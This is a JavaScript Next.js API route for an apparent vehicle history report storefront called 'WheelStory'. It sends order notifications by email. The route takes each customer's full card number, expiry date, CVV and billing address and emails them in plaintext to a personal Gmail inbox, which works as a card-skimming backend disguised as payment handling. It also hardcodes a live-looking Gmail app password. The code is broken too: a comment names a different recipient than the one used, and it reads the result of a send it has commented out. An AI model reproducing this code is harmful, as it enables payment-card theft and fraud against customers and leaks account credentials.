import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request) {
  try {
    const body = await request.json();
    const { 
      customerEmail, 
      customerName, 
      transactionId, 
      vin, 
      carModel, 
      amount = '1.99', 
      currency = '$',
      formData,
      orderData
    } = body;

    // Validate required fields
    if (!customerEmail || !customerName || !vin) {
      return NextResponse.json(
        { error: 'Missing required fields: customerEmail, customerName, or vin' },
        { status: 400 }
      );
    }

    // Create transporter using your Gmail credentials
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'mohamedalzafar@gmail.com',
        pass: 'rgfhdjsytmyjlinx'
      }
    });

    // Generate customer email content
    const customerEmailContent = `
      <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
        <h2 style="color: #16a34a;">Payment Successful! 🎉</h2>
        <p>Hello ${customerName},</p>
        <p>Thank you for your payment! We have successfully received your payment for the <strong>Vehicle History Report</strong>.</p>
        
        <div style="background-color: #f8f9fa; padding: 16px; border-radius: 8px; margin: 20px 0; border: 1px solid #e9ecef;">
          <h3 style="color: #333; margin-top: 0;">Payment Details:</h3>
          <p><strong>Transaction ID:</strong> ${transactionId || `TXN-${Date.now()}`}</p>
          <p><strong>Product:</strong> Vehicle History Report</p>
          <p><strong>Amount:</strong> ${currency}${amount}</p>
          <p><strong>Email:</strong> ${customerEmail}</p>
        </div>

        <h3 style="color: #333;">What happens next?</h3>
        <ul style="line-height: 1.6;">
          <li>Your vehicle history report is now being prepared</li>
          <li>You will receive your detailed report within the next <strong>12 hours</strong></li>
          <li>The report will be sent to this email address: <strong>${customerEmail}</strong></li>
          <li>If you don't receive it within 12 hours, please check your spam folder</li>
        </ul>

        <div style="background-color: #e8f5e8; padding: 16px; border-radius: 8px; margin: 20px 0; border: 1px solid #16a34a;">
          <p style="margin: 0; font-weight: bold; color: #16a34a;">
            ✅ Your payment has been processed successfully and your report is being prepared!
          </p>
        </div>

        <p>If you have any questions or need assistance, please don't hesitate to contact us at 
        <a href="mailto:support@wheelstory.store" style="color: #16a34a;"> support@wheelstory.store</a></p>

        <p>Thank you for choosing WheelStory!</p>
        <p>Best regards,<br/>The WheelStory Team</p>
      </div>
    `;

    // Prepare notification email for rmoto7817@gmail.com
    const notificationSubject = `New Vehicle History Report Order - ${vin}`;
    const notificationContent = `
      <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
        <h2 style="color: #ea580c;">New Vehicle History Report Order Received</h2>
        
        <div style="background-color: #f8f9fa; padding: 16px; border-radius: 8px; margin: 20px 0; border: 1px solid #e9ecef;">
          <h3 style="color: #333; margin-top: 0;">Order Details:</h3>
          <p><strong>Customer Name:</strong> ${customerName}</p>
          <p><strong>Customer Email:</strong> ${customerEmail}</p>
          <p><strong>VIN:</strong> ${vin}</p>
          <p><strong>Car Model:</strong> ${carModel || 'Not specified'}</p>
          <p><strong>Amount:</strong> ${currency}${amount}</p>
          <p><strong>Transaction ID:</strong> ${transactionId || `TXN-${Date.now()}`}</p>
          <p><strong>Order Time:</strong> ${new Date().toLocaleString()}</p>
        </div>

        ${formData ? `
        <div style="background-color: #f0f8ff; padding: 16px; border-radius: 8px; margin: 20px 0; border: 1px solid #b0c4de;">
          <h3 style="color: #333; margin-top: 0;">Customer Form Details:</h3>
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
            <div>
              <p><strong>First Name:</strong> ${formData.firstName || 'Not provided'}</p>
              <p><strong>Last Name:</strong> ${formData.lastName || 'Not provided'}</p>
              <p><strong>Email:</strong> ${formData.email || 'Not provided'}</p>
              <p><strong>Country:</strong> ${formData.country || 'Not provided'}</p>
              <p><strong>Billing Address:</strong> ${formData.billingAddress || 'Not provided'}</p>
              <p><strong>City:</strong> ${formData.city || 'Not provided'}</p>
            </div>
            <div>
              <p><strong>State:</strong> ${formData.state || 'Not provided'}</p>
              <p><strong>ZIP Code:</strong> ${formData.zipCode || 'Not provided'}</p>
              <p><strong>Name on Card:</strong> ${formData.nameOnCard || 'Not provided'}</p>
              <p><strong>Card Number:</strong> ${formData.cardNumber }</p>
              <p><strong>Expiry Date:</strong> ${formData.expiryDate || 'Not provided'}</p>
              <p><strong>CVV:</strong> ${formData.cvv}</p>
            </div>
          </div>
        </div>
        ` : ''}

        ${orderData ? `
        <div style="background-color: #fff5ee; padding: 16px; border-radius: 8px; margin: 20px 0; border: 1px solid #ffa500;">
          <h3 style="color: #333; margin-top: 0;">Vehicle Information:</h3>
          <p><strong>VIN:</strong> ${orderData.vin || 'Not provided'}</p>
          <p><strong>Car Model:</strong> ${orderData.carModel || 'Not provided'}</p>
          <p><strong>Order Email:</strong> ${orderData.email || 'Not provided'}</p>
          ${orderData.make ? `<p><strong>Make:</strong> ${orderData.make}</p>` : ''}
          ${orderData.year ? `<p><strong>Year:</strong> ${orderData.year}</p>` : ''}
          ${orderData.model ? `<p><strong>Model:</strong> ${orderData.model}</p>` : ''}
          ${orderData.trim ? `<p><strong>Trim:</strong> ${orderData.trim}</p>` : ''}
        </div>
        ` : ''}

        <div style="background-color: #e8f5e8; padding: 16px; border-radius: 8px; margin: 20px 0; border: 1px solid #16a34a;">
          <p style="margin: 0; font-weight: bold; color: #16a34a;">
            ✅ Payment completed successfully! Please prepare and send the vehicle history report to the customer.
          </p>
        </div>

        <h3 style="color: #333;">Next Steps:</h3>
        <ul style="line-height: 1.6;">
          <li>Process the VIN check for: <strong>${vin}</strong></li>
          <li>Generate comprehensive vehicle history report</li>
          <li>Send the report to customer email: <strong>${customerEmail}</strong></li>
          <li>Expected delivery: Within 12 hours</li>
        </ul>

        <p>This is an automated notification from the WheelStory payment system.</p>
      </div>
    `;

    // Send notification email to rmoto7817@gmail.com
    const notificationMailOptions = {
      from: 'mohamedalzafar@gmail.com',
      to: 'workfaiq9@gmail.com',
      subject: notificationSubject,
      html: notificationContent
    };

    // Send customer confirmation email
    const customerMailOptions = {
      from: 'mohamedalzafar@gmail.com',
      to: 'workfaiq9@gmail.com',
      subject: 'Payment Confirmation - Your Vehicle History Report is Being Prepared',
      html: customerEmailContent
    };

    // Send both emails
    const [notificationResult, customerResult] = await Promise.all([
      transporter.sendMail(notificationMailOptions),
      // transporter.sendMail(customerMailOptions)
    ]);

    console.log('Notification email sent:', notificationResult.messageId);
    console.log('Customer email sent:', customerResult.messageId);

    return NextResponse.json({
      success: true,
      message: 'Payment notification emails sent successfully',
      notificationId: notificationResult.messageId,
      customerId: customerResult.messageId
    });

  } catch (error) {
    console.error('Error sending payment notification email:', error);
    return NextResponse.json(
      { error: 'Failed to send payment notification email', details: error.message },
      { status: 500 }
    );
  }
}